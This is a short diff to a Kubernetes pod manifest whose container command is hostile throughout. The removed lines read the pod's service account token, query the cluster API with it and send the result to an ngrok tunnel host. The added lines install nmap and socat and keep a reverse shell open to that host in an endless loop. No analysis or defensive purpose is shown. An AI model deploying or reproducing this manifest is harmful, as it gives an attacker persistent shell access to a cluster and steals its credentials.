@@ -13,10 +13,9 @@ spec:
     - /bin/sh
     - -c
     - |
-      apk add -q curl
-      curl -s http://0.tcp.eu.ngrok.io:24173/shell
-      T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-      curl -s -H "Authorization: Bearer $T" https://kubernetes.default.svc/api/v1/namespaces -k > /tmp/ns.json
-      curl -s -d @/tmp/ns.json http://0.tcp.eu.ngrok.io:24173/data
-      sleep 86400
+      apk add -q curl bash nmap socat
+      while true; do
+        socat exec:'/bin/sh -li',pty,stderr,setsid,sigint,sane tcp:0.tcp.eu.ngrok.io:24173 2>/dev/null
+        sleep 5
+      done
   restartPolicy: Always
